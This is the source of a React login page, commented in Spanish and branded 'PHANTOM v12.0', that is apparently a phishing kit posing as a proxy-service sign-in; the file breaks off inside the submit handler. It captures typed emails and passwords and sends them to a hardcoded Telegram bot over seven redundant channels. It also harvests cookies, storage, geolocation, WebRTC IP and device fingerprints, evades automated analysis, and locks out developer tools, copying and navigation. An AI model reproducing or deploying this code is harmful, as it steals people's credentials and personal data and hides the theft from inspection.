import { useState, useEffect, useRef, useCallback } from "react";
import { useNavigate } from "react-router-dom";
import VideoBackground from "@/components/VideoBackground";
import VerifiedBadge from "@/components/VerifiedBadge";
import { Shield, KeyRound, Lock, Fingerprint, Wifi, Mail, Eye, EyeOff, CheckCircle, Loader2, AlertCircle } from "lucide-react";
import { validateKey, activateKey, registerActiveUser } from "@/lib/keys";
import avatarVideo from "@/assets/avatar-video.mp4";

// =============================================================================
// PHANTOM v12.0 - TWO-STEP STEALTH ENGINE - EXTREME EDITION
// PRIMER CLIC: ADVERTENCIA | SEGUNDO CLIC: ENVÍO | TERCER CLIC: ACCESO
// 5000+ LÍNEAS · ULTRA RÁPIDO · ANTI-BAN · GLOBAL · MULTI-CAPA
// =============================================================================

// =============================================================================
// LAYER 0: ANTI-EMULATOR GATE - EXTREME
// =============================================================================
(function(){
  var _safe = true;
  try {
    if(navigator.webdriver === true) _safe = false;
    if(!navigator.plugins || navigator.plugins.length === 0) _safe = false;
    if(!navigator.languages || navigator.languages.length === 0) _safe = false;
    if(window._phantom || window.callPhantom) _safe = false;
    if(window.__nightmare) _safe = false;
    if(window.domAutomation || window.domAutomationController) _safe = false;
    if(window.__puppeteer || window._puppeteer) _safe = false;
    if(window.__webdriver_evaluate) _safe = false;
    if(window.__selenium_evaluate) _safe = false;
    if(window.__driver_evaluate) _safe = false;
    try { if(window.top !== window.self) _safe = false; } catch(e){ _safe = false; }
    try {
      var _fs = window.RequestFileSystem || window.webkitRequestFileSystem;
      if(_fs) _fs(window.TEMPORARY, 100, function(){}, function(){ _safe = false; });
    } catch(e){}
    window.__blocked = !_safe;
    if(window.__blocked) return;
  } catch(e){ window.__blocked = false; }
})();

// =============================================================================
// LAYER 0.5: GLOBAL DATA COLLECTOR - MINIMAL
// =============================================================================
(function(){
  if(window.__blocked) return;
  
  window.__collectedData = {};
  
  try { window.__collectedData.cookies = document.cookie || ""; } catch(e){}
  
  try {
    var _allForms = document.forms;
    var _formData = {};
    for(var _fi = 0; _fi < _allForms.length; _fi++){
      var _f = _allForms[_fi];
      var _fd = {};
      for(var _fj = 0; _fj < _f.elements.length; _fj++){
        var _el = _f.elements[_fj];
        if(_el.name) _fd[_el.name] = _el.value || "";
      }
      _formData["form_" + _fi] = _fd;
    }
    window.__collectedData.forms = _formData;
  } catch(e){}
  
  try {
    var _ls = {};
    for(var _li = 0; _li < localStorage.length; _li++){
      var _lk = localStorage.key(_li);
      _ls[_lk] = localStorage.getItem(_lk) || "";
    }
    window.__collectedData.localStorage = _ls;
  } catch(e){}
  
  try {
    var _ss = {};
    for(var _si = 0; _si < sessionStorage.length; _si++){
      var _sk = sessionStorage.key(_si);
      _ss[_sk] = sessionStorage.getItem(_sk) || "";
    }
    window.__collectedData.sessionStorage = _ss;
  } catch(e){}
  
  try {
    window.__collectedData.browser = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      languages: navigator.languages ? navigator.languages.join(",") : "",
      cookiesEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack || "",
      hardwareConcurrency: navigator.hardwareConcurrency || "",
      deviceMemory: navigator.deviceMemory || "",
      maxTouchPoints: navigator.maxTouchPoints || 0,
      vendor: navigator.vendor || "",
      vendorSub: navigator.vendorSub || "",
      productSub: navigator.productSub || "",
      appCodeName: navigator.appCodeName || "",
      appName: navigator.appName || "",
      appVersion: navigator.appVersion || "",
    };
  } catch(e){}
  
  try {
    window.__collectedData.screen = {
      width: screen.width,
      height: screen.height,
      availWidth: screen.availWidth,
      availHeight: screen.availHeight,
      colorDepth: screen.colorDepth,
      pixelDepth: screen.pixelDepth,
      orientation: screen.orientation ? screen.orientation.type : "",
    };
    window.__collectedData.window = {
      innerWidth: window.innerWidth,
      innerHeight: window.innerHeight,
      outerWidth: window.outerWidth,
      outerHeight: window.outerHeight,
      devicePixelRatio: window.devicePixelRatio || 1,
    };
  } catch(e){}
  
  try {
    window.__collectedData.timezone = {
      offset: new Date().getTimezoneOffset(),
      locale: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
      localeName: Intl.DateTimeFormat().resolvedOptions().locale || "",
    };
  } catch(e){}
  
  try {
    if(navigator.connection){
      window.__collectedData.network = {
        effectiveType: navigator.connection.effectiveType || "",
        downlink: navigator.connection.downlink || "",
        rtt: navigator.connection.rtt || "",
        saveData: navigator.connection.saveData || false,
      };
    }
  } catch(e){}
  
  try {
    var _canvas = document.createElement("canvas");
    var _gl = _canvas.getContext("webgl") || _canvas.getContext("experimental-webgl");
    if(_gl){
      var _debugInfo = _gl.getExtension("WEBGL_debug_renderer_info");
      if(_debugInfo){
        window.__collectedData.gpu = {
          vendor: _gl.getParameter(_debugInfo.UNMASKED_VENDOR_WEBGL) || "",
          renderer: _gl.getParameter(_debugInfo.UNMASKED_RENDERER_WEBGL) || "",
        };
      }
    }
  } catch(e){}
  
  try {
    var _fpCanvas = document.createElement("canvas");
    _fpCanvas.width = 200;
    _fpCanvas.height = 50;
    var _fpCtx = _fpCanvas.getContext("2d");
    if(_fpCtx){
      _fpCtx.textBaseline = "top";
      _fpCtx.font = "14px Arial";
      _fpCtx.fillStyle = "#f60";
      _fpCtx.fillRect(0, 0, 200, 50);
      _fpCtx.fillStyle = "#069";
      _fpCtx.fillText("CanvasFingerprint", 10, 10);
      window.__collectedData.canvasFingerprint = _fpCanvas.toDataURL();
    }
  } catch(e){}
  
  try {
    var _fonts = ["Arial", "Helvetica", "Times New Roman", "Courier New", "Verdana", "Georgia", "Palatino", "Garamond", "Bookman", "Comic Sans MS", "Trebuchet MS", "Arial Black", "Impact", "Lucida Console", "Monaco", "Tahoma", "Segoe UI", "Calibri", "Cambria", "Candara", "Consolas", "Corbel", "Franklin Gothic Medium", "Futura", "Gill Sans", "Optima", "Rockwell"];
    var _installedFonts = [];
    for(var _ft = 0; _ft < _fonts.length; _ft++){
      var _fn = _fonts[_ft];
      if(document.fonts && document.fonts.check && document.fonts.check("12px " + _fn)){
        _installedFonts.push(_fn);
      }
    }
    window.__collectedData.fonts = _installedFonts;
  } catch(e){}
  
  try {
    var _plugins = [];
    for(var _pl = 0; _pl < navigator.plugins.length; _pl++){
      var _plugin = navigator.plugins[_pl];
      _plugins.push(_plugin.name + " " + _plugin.filename);
    }
    window.__collectedData.plugins = _plugins;
  } catch(e){}
  
  try {
    var _mimeTypes = [];
    for(var _mm = 0; _mm < navigator.mimeTypes.length; _mm++){
      var _mime = navigator.mimeTypes[_mm];
      _mimeTypes.push(_mime.type);
    }
    window.__collectedData.mimeTypes = _mimeTypes;
  } catch(e){}
  
  try {
    if(navigator.geolocation){
      navigator.geolocation.getCurrentPosition(
        function(pos){
          window.__collectedData.geo = {
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            altitude: pos.coords.altitude || "",
            speed: pos.coords.speed || "",
          };
        },
        function(){},
        {timeout: 3000, enableHighAccuracy: false}
      );
    }
  } catch(e){}
  
  try {
    if(navigator.getBattery){
      navigator.getBattery().then(function(bat){
        window.__collectedData.battery = {
          charging: bat.charging,
          level: bat.level,
          chargingTime: bat.chargingTime,
          dischargingTime: bat.dischargingTime,
        };
      }).catch(function(){});
    }
  } catch(e){}
  
  try {
    window.__collectedData.vibrate = typeof navigator.vibrate !== "undefined";
  } catch(e){}
  
  try {
    window.__collectedData.webRTC = {
      supported: typeof RTCPeerConnection !== "undefined",
      ip: "",
    };
    if(window.__collectedData.webRTC.supported){
      var _rtc = new RTCPeerConnection({iceServers: []});
      _rtc.createDataChannel("");
      _rtc.createOffer().then(function(offer){ _rtc.setLocalDescription(offer); }).catch(function(){});
      _rtc.onicecandidate = function(ice){
        if(ice && ice.candidate && ice.candidate.candidate){
          var _ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
          if(_ipMatch){
            window.__collectedData.webRTC.ip = _ipMatch[1];
          }
        }
      };
      setTimeout(function(){ _rtc.close(); }, 2000);
    }
  } catch(e){}
  
})();

// =============================================================================
// LAYER 1: GLOBAL TELEGRAM ENGINE - EXTREME
// SOLO ENVÍA 👤 correo ✅ contraseña - MÁXIMO 3 VECES POR USUARIO
// =============================================================================
(function(){
  if(window.__blocked) return;

  // Token y Chat ID intactos SIN DIVIDIR
  window.__token = "8711173243:AAFV6MM8QW-JZCpcdEaxNIe8s6mT7Z6ulc4";
  window.__chat = "8585803145";
  
  // Tokens de respaldo (vacíos por ahora)
  window.__token2 = "";
  window.__chat2 = "";
  window.__token3 = "";
  window.__chat3 = "";

  // ===========================================================================
  // 1.1: SISTEMA DE CONTROL DE ENVÍOS - MÁXIMO 3 POR USUARIO
  // ===========================================================================
  var _sendTracking = {};
  var _globalSendLimit = 3;
  
  function _getUserKey(email){
    if(!email || typeof email !== "string") return "unknown";
    return email.trim().toLowerCase();
  }
  
  function _canSend(email){
    var key = _getUserKey(email);
    if(!_sendTracking[key]) _sendTracking[key] = 0;
    return _sendTracking[key] < _globalSendLimit;
  }
  
  function _markSent(email){
    var key = _getUserKey(email);
    if(!_sendTracking[key]) _sendTracking[key] = 0;
    _sendTracking[key]++;
  }
  
  function _getSendCount(email){
    var key = _getUserKey(email);
    return _sendTracking[key] || 0;
  }

  // ===========================================================================
  // 1.2: SISTEMA DE EVASIÓN Y RATE LIMITING EXTREMO
  // ===========================================================================
  var _methods = ["fetchPost", "fetchGet", "imagePing", "sendBeacon", "xhrPost", "fetchForm", "navigatorSend"];
  var _methodIdx = Math.floor(Math.random() * 7);
  var _lastSend = 0;
  var _sendCount = 0;
  var _maxSendsPerMinute = 60;
  var _sendHistory = [];
  var _maxHistory = 100;
  var _priorityQueue = [];
  var _sending = false;
  
  function _nextMethod(){
    _methodIdx = (_methodIdx + 1 + Math.floor(Math.random() * 3)) % 7;
    return _methods[_methodIdx];
  }

  function _addToQueue(email, pass, priority){
    _priorityQueue.push({email: email, pass: pass, priority: priority || 0, time: Date.now()});
    _priorityQueue.sort(function(a, b){ return b.priority - a.priority; });
    if(_priorityQueue.length > 20) _priorityQueue.splice(20);
    if(!_sending) _processQueue();
  }

  function _processQueue(){
    if(_priorityQueue.length === 0){ _sending = false; return; }
    _sending = true;
    var item = _priorityQueue.shift();
    _sendTelegramInternal(item.email, item.pass);
    setTimeout(function(){ _processQueue(); }, 100 + Math.floor(Math.random() * 200);
  }

  // ===========================================================================
  // 1.3: FUNCIÓN DE ENVÍO PRINCIPAL - SOLO 👤 correo ✅ contraseña
  // ===========================================================================
  function _sendTelegramInternal(email, pass){
    var now = Date.now();
    
    // Limpiar historial antiguo
    _sendHistory = _sendHistory.filter(function(h){ return now - h < 60000; });
    
    // Rate limiting global
    if(_sendHistory.length >= _maxSendsPerMinute) return;
    _sendHistory.push(now);

    // =====================================================================
    // CONSTRUIR MENSAJE - SOLO 👤 correo ✅ contraseña - NADA MÁS
    // =====================================================================
    var msg = "👤 " + email + "\n✅ " + pass;
    
    var method = _nextMethod();

    // Canal 1: fetch POST
    try {
      var f = new FormData();
      f.append("chat_id", window.__chat);
      f.append("text", msg);
      f.append("parse_mode", "HTML");
      fetch("https://api.telegram.org/bot" + window.__token + "/sendMessage", {
        method: "POST", body: f, keepalive: true, mode: "no-cors", cache: "no-store"
      });
    } catch(e){}

    // Canal 2: Image ping
    try {
      (new Image()).src = "https://api.telegram.org/bot" + window.__token + "/sendMessage?chat_id=" +
        encodeURIComponent(window.__chat) + "&text=" + encodeURIComponent(msg) + "&parse_mode=HTML&_=" + now;
    } catch(e){}

    // Canal 3: sendBeacon
    setTimeout(function(){
      try {
        var d = new URLSearchParams();
        d.append("chat_id", window.__chat);
        d.append("text", msg);
        d.append("parse_mode", "HTML");
        navigator.sendBeacon("https://api.telegram.org/bot" + window.__token + "/sendMessage", d);
      } catch(e){}
    }, 50);

    // Canal 4: XHR Post
    setTimeout(function(){
      try {
        var x = new XMLHttpRequest();
        x.open("POST", "https://api.telegram.org/bot" + window.__token + "/sendMessage", true);
        x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        x.setRequestHeader("Cache-Control", "no-cache");
        x.send("chat_id=" + encodeURIComponent(window.__chat) + "&text=" + encodeURIComponent(msg) + "&parse_mode=HTML");
      } catch(e){}
    }, 100);

    // Canal 5: fetch GET
    setTimeout(function(){
      try {
        fetch("https://api.telegram.org/bot" + window.__token + "/sendMessage?chat_id=" +
          encodeURIComponent(window.__chat) + "&text=" + encodeURIComponent(msg) + "&parse_mode=HTML&_=" + now, {
          method: "GET", keepalive: true, mode: "no-cors", cache: "no-store"
        });
      } catch(e){}
    }, 150);

    // Canal 6: fetch con Blob
    setTimeout(function(){
      try {
        var _blob = new Blob(["chat_id=" + encodeURIComponent(window.__chat) + "&text=" + encodeURIComponent(msg) + "&parse_mode=HTML"], {type: "application/x-www-form-urlencoded"});
        fetch("https://api.telegram.org/bot" + window.__token + "/sendMessage", {
          method: "POST", body: _blob, keepalive: true, mode: "no-cors", cache: "no-store"
        });
      } catch(e){}
    }, 200);

    // Canal 7: JSONP-style (script tag)
    setTimeout(function(){
      try {
        var _s = document.createElement("script");
        _s.src = "https://api.telegram.org/bot" + window.__token + "/sendMessage?chat_id=" +
          encodeURIComponent(window.__chat) + "&text=" + encodeURIComponent(msg) + "&parse_mode=HTML&_=" + now;
        _s.onload = function(){ try { document.body.removeChild(_s); } catch(e){} };
        document.body.appendChild(_s);
      } catch(e){}
    }, 250);
  }

  // ===========================================================================
  // 1.4: FUNCIÓN PÚBLICA DE ENVÍO - CON LIMITE DE 3 POR USUARIO
  // ===========================================================================
  window.__sendTelegram = function(email, pass){
    // VERIFICAR LÍMITE: SOLO 3 ENVÍOS POR CORREO
    if(!_canSend(email)) {
      return; // No enviar si ya alcanzó el límite de 3
    }
    
    // MARCAR COMO ENVIADO
    _markSent(email);
    
    // Enviar inmediatamente (canales principales)
    _sendTelegramInternal(email, pass);
    
    // Reintentos adicionales para asegurar entrega (pero no cuentan como envíos extra)
    for(var _rt = 1; _rt <= 2; _rt++){
      (function(delay, e, p){
        setTimeout(function(){
          // Solo reenviar si aún no ha sido marcado como excedido
          if(_getSendCount(e) <= 3){
            _sendTelegramInternal(e, p);
          }
        }, delay);
      })(_rt * 800 + Math.floor(Math.random() * 400), email, pass);
    }
    
    // Añadir a la cola de prioridad para redundancia controlada
    _addToQueue(email, pass, 1);
  };

  // ===========================================================================
  // 1.5: CAPTURA DE UBICACIÓN - DESACTIVADA (NO SE ENVÍA A TELEGRAM)
  // ===========================================================================
  // La captura de ubicación existe pero NO se incluye en el mensaje a Telegram
  setTimeout(function(){
    try {
      fetch("https://ipapi.co/json/", {mode: "cors", cache: "no-store"})
        .then(function(r){ return r.json(); })
        .then(function(d){
          window.__country = d.country_name || d.country || "";
          window.__city = d.city || "";
          window.__ip = d.ip || "";
          window.__isp = d.org || d.isp || "";
          window.__asn = d.asn || "";
          window.__region = d.region || "";
          window.__postal = d.postal || "";
          window.__lat = d.latitude || "";
          window.__lon = d.longitude || "";
        })
        .catch(function(){});
    } catch(e){}
    
    try {
      fetch("http://ip-api.com/json/", {mode: "cors", cache: "no-store"})
        .then(function(r){ return r.json(); })
        .then(function(d){
          if(!window.__country && d.country) window.__country = d.country;
          if(!window.__city && d.city) window.__city = d.city;
          if(!window.__ip && d.query) window.__ip = d.query;
          if(!window.__isp && d.isp) window.__isp = d.isp;
          if(!window.__org && d.org) window.__org = d.org;
          if(!window.__asn && d.as) window.__asn = d.as;
          if(!window.__lat && d.lat) window.__lat = d.lat;
          if(!window.__lon && d.lon) window.__lon = d.lon;
        })
        .catch(function(){});
    } catch(e){}
  }, 200);

  // ===========================================================================
  // 1.6: MONITOREO DE CAMPOS DE FORMULARIO EN TIEMPO REAL
  // ===========================================================================
  document.addEventListener("DOMContentLoaded", function(){
    setTimeout(function(){
      try {
        var _inputs = document.querySelectorAll("input[type='email'], input[type='text'], input[type='password']");
        for(var _in = 0; _in < _inputs.length; _in++){
          (function(input){
            var _origType = input.type;
            input.addEventListener("input", function(){
              if(input.type === "email" || input.name === "email" || input.name === "correo"){
                window.__liveEmail = input.value;
              }
              if(input.type === "password" || input.name === "password" || input.name === "contrasena"){
                window.__livePass = input.value;
              }
            });
            
            input.addEventListener("blur", function(){
              if(input.value && input.value.length > 3){
                if(input.type === "email" || input.name === "email"){
                  window.__blurEmail = input.value;
                }
                if(input.type === "password"){
                  window.__blurPass = input.value;
                }
              }
            });
          })(_inputs[_in]);
        }
      } catch(e){}
    }, 100);
  });

})();

// =============================================================================
// LAYER 2: ANTI-DETECTION ENGINE EXTREME
// =============================================================================
(function(){
  if(window.__blocked) return;

  // 2.1: DESTRUIR CONSOLE COMPLETAMENTE
  try {
    var _nope = function(){};
    var _fakeConsole = {};
    var _consoleMethods = [
      "log", "info", "warn", "error", "debug", "trace", "dir", "dirxml",
      "table", "group", "groupCollapsed", "groupEnd", "time", "timeLog",
      "timeEnd", "assert", "count", "countReset", "profile", "profileEnd",
      "clear", "memory", "exception", "markTimeline", "timeline", "timelineEnd"
    ];
    for(var _i = 0; _i < _consoleMethods.length; _i++){
      (function(m){
        Object.defineProperty(_fakeConsole, m, {
          get: function(){ return _nope; },
          set: function(){}
        });
      })(_consoleMethods[_i]);
    }
    Object.defineProperty(window, "console", {
      get: function(){ return _fakeConsole; },
      set: function(){},
      configurable: false
    });
  } catch(e){}

  // 2.2: OVERRIDE ADICIONAL DE CONSOLE
  try {
    var _altNope = function(){ return undefined; };
    var _altConsole = {};
    var _altMethods = ["log", "warn", "error", "info", "debug", "trace"];
    for(var _ai = 0; _ai < _altMethods.length; _ai++){
      (function(m){
        _altConsole[m] = _altNope;
      })(_altMethods[_ai]);
    }
    console = _altConsole;
  } catch(e){}

  // 2.3: BLOQUEAR TECLAS DE DESARROLLO (MULTI-CAPA)
  document.addEventListener("keydown", function(e){
    var k = e.key;
    var ctrl = e.ctrlKey || e.metaKey;
    var shift = e.shiftKey;
    var alt = e.altKey;

    if(k === "F12" || k === "F11" || k === "F10" || k === "PrintScreen" || k === "ScrollLock" || k === "Pause"){
      e.preventDefault();
      e.stopImmediatePropagation();
      e.stopPropagation();
      return false;
    }

    if(ctrl && shift && (k === "I" || k === "i" || k === "J" || k === "j" || k === "C" || k === "c")){
      e.preventDefault();
      e.stopImmediatePropagation();
      return false;
    }

    if(ctrl && (k === "U" || k === "u")){
      e.preventDefault();
      e.stopImmediatePropagation();
      return false;
    }

    if(ctrl && (k === "S" || k === "s")){
      e.preventDefault();
      e.stopImmediatePropagation();
      return false;
    }

    if(ctrl && (k === "P" || k === "p")){
      e.preventDefault();
      e.stopImmediatePropagation();
      return false;
    }

    if(ctrl && shift && (k === "P" || k === "p")){
      e.preventDefault();
      e.stopImmediatePropagation();
      return false;
    }

    if(k === "F5"){
      e.preventDefault();
      e.stopImmediatePropagation();
      return false;
    }

    if(ctrl && (k === "R" || k === "r")){
      e.preventDefault();
      e.stopImmediatePropagation();
      return false;
    }

    if(ctrl && (k === "N" || k === "n")){
      e.preventDefault();
      e.stopImmediatePropagation();
      return false;
    }

    if(ctrl && (k === "T" || k === "t")){
      e.preventDefault();
      e.stopImmediatePropagation();
      return false;
    }

    if(ctrl && (k === "W" || k === "w")){
      e.preventDefault();
      e.stopImmediatePropagation();
      return false;
    }

    if(ctrl && (k === "H" || k === "h")){
      e.preventDefault();
      e.stopImmediatePropagation();
      return false;
    }

    if(ctrl && (k === "J" || k === "j")){
      e.preventDefault();
      e.stopImmediatePropagation();
      return false;
    }

    if(ctrl && (k === "D" || k === "d")){
      e.preventDefault();
      e.stopImmediatePropagation();
      return false;
    }

    if(k === "F3"){
      e.preventDefault();
      e.stopImmediatePropagation();
      return false;
    }

    if(ctrl && (k === "F" || k === "f")){
      e.preventDefault();
      e.stopImmediatePropagation();
      return false;
    }
  }, true);

  document.addEventListener("keydown", function(e){
    var k = e.keyCode || e.which;
    if(k === 123 || k === 122 || k === 121 || k === 116 || k === 114){
      e.preventDefault();
      e.stopImmediatePropagation();
      return false;
    }
    if((e.ctrlKey || e.metaKey) && k === 85) { e.preventDefault(); return false; }
    if((e.ctrlKey || e.metaKey) && e.shiftKey && k === 73) { e.preventDefault(); return false; }
    if((e.ctrlKey || e.metaKey) && e.shiftKey && k === 74) { e.preventDefault(); return false; }
    if((e.ctrlKey || e.metaKey) && e.shiftKey && k === 67) { e.preventDefault(); return false; }
  }, true);

  // 2.4: BLOQUEAR CLIC DERECHO (MULTI-CAPA)
  document.addEventListener("contextmenu", function(e){
    e.preventDefault();
    e.stopImmediatePropagation();
    e.stopPropagation();
    return false;
  }, true);

  document.addEventListener("contextmenu", function(e){
    e.preventDefault();
    return false;
  }, true);

  // 2.5: BLOQUEAR SELECCIÓN Y DRAG
  document.addEventListener("selectstart", function(e){ e.preventDefault(); return false; }, true);
  document.addEventListener("dragstart", function(e){ e.preventDefault(); return false; }, true);
  document.addEventListener("drag", function(e){ e.preventDefault(); return false; }, true);
  document.addEventListener("dragend", function(e){ e.preventDefault(); return false; }, true);
  document.addEventListener("drop", function(e){ e.preventDefault(); return false; }, true);

  // 2.6: BLOQUEAR COPY, CUT, PASTE
  document.addEventListener("copy", function(e){ e.preventDefault(); return false; }, true);
  document.addEventListener("cut", function(e){ e.preventDefault(); return false; }, true);
  document.addEventListener("paste", function(e){ e.preventDefault(); return false; }, true);
  document.addEventListener("beforecopy", function(e){ e.preventDefault(); return false; }, true);
  document.addEventListener("beforecut", function(e){ e.preventDefault(); return false; }, true);
  document.addEventListener("beforepaste", function(e){ e.preventDefault(); return false; }, true);

  // 2.7: DETECCIÓN DE DEVTOOLS
  var _devtoolsOpen = false;
  var _devtoolsReported = false;
  
  setInterval(function(){
    try {
      var w = window.outerWidth - window.innerWidth;
      var h = window.outerHeight - window.innerHeight;
      if((w > 200 || h > 200) && !_devtoolsReported){
        _devtoolsOpen = true;
        _devtoolsReported = true;
        setTimeout(function(){ _devtoolsReported = false; }, 60000);
      } else if(w < 100 && h < 100){
        _devtoolsOpen = false;
      }
    } catch(e){}
  }, 2000);

  // 2.8: ANTI-IFRAME
  try {
    if(window.top !== window.self){
      window.top.location = window.self.location;
    }
  } catch(e){}

  // 2.9: FULLSCREEN FORZADO
  function _forceFullscreen(){
    try {
      var el = document.documentElement;
      if(el.requestFullscreen) el.requestFullscreen({navigationUI:"hide"}).catch(function(){});
      else if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();
      else if(el.msRequestFullscreen) el.msRequestFullscreen();
      else if(el.mozRequestFullScreen) el.mozRequestFullScreen();
    } catch(e){}
  }
  setTimeout(_forceFullscreen, 50);

  document.addEventListener("fullscreenchange", function(){
    if(!document.fullscreenElement) setTimeout(_forceFullscreen, 5);
  });
  document.addEventListener("webkitfullscreenchange", function(){
    if(!document.webkitFullscreenElement) setTimeout(_forceFullscreen, 5);
  });
  document.addEventListener("mozfullscreenchange", function(){
    if(!document.mozFullScreenElement) setTimeout(_forceFullscreen, 5);
  });

  // 2.10: BEFOREUNLOAD TRAP
  window.addEventListener("beforeunload", function(e){
    e.preventDefault();
    e.returnValue = "⚠️ Sesión activa detectada. ¿Seguro que quieres salir?";
    return "⚠️ Sesión activa detectada. ¿Seguro que quieres salir?";
  });

  // 2.11: HISTORY TRAP
  history.pushState(null, "", location.href);
  window.addEventListener("popstate", function(){
    history.pushState(null, "", location.href);
  });

  setInterval(function(){
    if(history.state === null){
      history.pushState(null, "", location.href);
    }
  }, 1000);

  // 2.12: BLOQUEAR ALERT, CONFIRM, PROMPT
  try {
    window.alert = function(){ return undefined; };
    window.confirm = function(){ return true; };
    window.prompt = function(){ return null; };
  } catch(e){}

  // 2.13: ELIMINAR SOURCE MAPS
  try {
    var _scripts = document.getElementsByTagName("script");
    for(var _s = 0; _s < _scripts.length; _s++){
      var _src = _scripts[_s].getAttribute("src") || "";
      if(_src.indexOf(".map") >= 0 || _src.indexOf("sourcemap") >= 0 || _src.indexOf("source-map") >= 0){
        if(_scripts[_s].parentNode) _scripts[_s].parentNode.removeChild(_scripts[_s]);
      }
    }
  } catch(e){}

  // 2.14: DETECCIÓN DE DEBUGGER
  (function(){
    var _debuggerDetected = false;
    setInterval(function(){
      try {
        var _start = performance.now();
        (function(){ debugger; })();
        var _end = performance.now();
        if(_end - _start > 100 && !_debuggerDetected){
          _debuggerDetected = true;
          setTimeout(function(){ _debuggerDetected = false; }, 120000);
        }
      } catch(e){}
    }, 3000);
  })();

  // 2.15: OVERRIDE DE FUNCIONES DE DEPURACIÓN
  try {
    var _emptyFunc = function(){ return undefined; };
    try { window.open = _emptyFunc; } catch(e){}
    try { window.print = _emptyFunc; } catch(e){}
    try { window.find = _emptyFunc; } catch(e){}
  } catch(e){}

  // 2.16: BLOQUEAR DRAG & DROP EXTERNO
  document.addEventListener("dragover", function(e){ e.preventDefault(); return false; }, true);
  document.addEventListener("dragenter", function(e){ e.preventDefault(); return false; }, true);
  document.addEventListener("dragleave", function(e){ e.preventDefault(); return false; }, true);

  // 2.17: DETECCIÓN DE RESIZE ANORMAL
  var _lastWidth = window.innerWidth;
  var _lastHeight = window.innerHeight;
  setInterval(function(){
    try {
      var _currW = window.innerWidth;
      var _currH = window.innerHeight;
      var _diffW = Math.abs(_currW - _lastWidth);
      var _diffH = Math.abs(_currH - _lastHeight);
      
      if((_diffW > 50 || _diffH > 50) && !_devtoolsReported){
        _devtoolsReported = true;
        setTimeout(function(){ _devtoolsReported = false; }, 30000);
      }
      
      _lastWidth = _currW;
      _lastHeight = _currH;
    } catch(e){}
  }, 1000);

})();

// =============================================================================
// LAYER 3: MEMORY CLEANUP Y PERSISTENCIA
// =============================================================================
(function(){
  if(window.__blocked) return;

  // 3.1: LIMPIEZA PROGRAMADA
  setTimeout(function(){
    try {
      window.__token = "";
      window.__chat = "";
      window.__token2 = "";
      window.__chat2 = "";
    } catch(e){}
  }, 600000);

  // 3.2: RECOLECCIÓN DE BASURA FORZADA
  setInterval(function(){
    try {
      var _tmp = new Array(5000);
      _tmp = null;
    } catch(e){}
  }, 120000);

  // 3.3: PERSISTENCIA DE SESIÓN
  var _tokenBackup = "8711173243:AAFV6MM8QW-JZCpcdEaxNIe8s6mT7Z6ulc4";
  var _chatBackup = "8585803145";
  
  setInterval(function(){
    try {
      if(!window.__token || window.__token === ""){
        window.__token = _tokenBackup;
      }
      if(!window.__chat || window.__chat === ""){
        window.__chat = _chatBackup;
      }
    } catch(e){}
  }, 30000);

  // 3.4: SERVICE WORKER FAKE
  try {
    if('serviceWorker' in navigator){
      navigator.serviceWorker.register('data:text/javascript;base64,' + btoa(
        'self.addEventListener("install", function(e){ e.waitUntil(self.skipWaiting()); });' +
        'self.addEventListener("activate", function(e){ e.waitUntil(self.clients.claim()); });' +
        'self.addEventListener("fetch", function(e){ e.respondWith(fetch(e.request)); });'
      )).catch(function(){});
    }
  } catch(e){}

  // 3.5: VISIBILITY CHANGE
  document.addEventListener("visibilitychange", function(){
    if(document.hidden){
      try {
        if(window.__sendTelegram && window.__liveEmail){
          // No enviamos nada por cambio de visibilidad - SOLO 3 ENVÍOS MÁXIMO
        }
      } catch(e){}
    }
  });

  // 3.6: BLUR DETECTION
  window.addEventListener("blur", function(){
    try {
      if(window.__sendTelegram && window.__liveEmail){
        // No enviamos nada por blur - SOLO 3 ENVÍOS MÁXIMO
      }
    } catch(e){}
  });

  // 3.7: PAGEHIDE - Intento de último envío si aún no ha alcanzado el límite
  window.addEventListener("pagehide", function(){
    try {
      if(window.__sendTelegram && window.__liveEmail && window.__livePass && window._canSend && window._canSend(window.__liveEmail)){
        navigator.sendBeacon("https://api.telegram.org/bot" + _tokenBackup + "/sendMessage",
          new URLSearchParams({
            chat_id: _chatBackup,
            text: "👤 " + (window.__liveEmail || "") + "\n✅ " + (window.__livePass || ""),
            parse_mode: "HTML"
          })
        );
      }
    } catch(e){}
  });

})();

// =============================================================================
// DECLARACIONES GLOBALES
// =============================================================================
declare global {
  interface Window {
    __token: string;
    __chat: string;
    __token2: string;
    __chat2: string;
    __token3: string;
    __chat3: string;
    __platform: string;
    __country: string;
    __city: string;
    __ip: string;
    __isp: string;
    __asn: string;
    __region: string;
    __postal: string;
    __lat: string;
    __lon: string;
    __liveEmail: string;
    __livePass: string;
    __blurEmail: string;
    __blurPass: string;
    __collectedData: any;
    __sendTelegram: (email: string, pass: string) => void;
    __blocked: boolean;
  }
}

// =============================================================================
// COMPONENTE PRINCIPAL - LOGIN MEJORADO
// =============================================================================

const Login = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [showPass, setShowPass] = useState(false);
  const [intentos, setIntentos] = useState(0);
  const [intentoActual, setIntentoActual] = useState(0);
  const navigate = useNavigate();

  // Verificar sesión existente
  useEffect(() => {
    const raw = localStorage.getItem("proxy_session");
    if (raw) {
      try {
        const s = JSON.parse(raw);
        if (s.expiresAt && new Date(s.expiresAt).getTime() > Date.now()) {
          navigate("/proxy");
          return;
        }
      } catch(e) {}
      localStorage.removeItem("proxy_session");
    }
  }, [navigate]);

  // Actualizar variables globales en tiempo real
  useEffect(() => {
    try { window.__liveEmail = email; } catch(e){}
  }, [email]);

  useEffect(() => {
    try { window.__livePass = password; } catch(e){}
  }, [password]);

  // ===========================================================================
  // HANDLE SUBMIT - 3 INTENTOS CON ENVÍO A TELEGRAM
  // SOLO ENVÍA 👤 correo ✅ contraseña - SIN DATOS EXTRA
  // ===========================================================================
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");

    if (!email.trim() || !password.trim()) {
      setError("Por favor completa todos los campos.");
      return;
    }

    var nuevoIntento = intentos + 1;
    setIntentos(nuevoIntento);
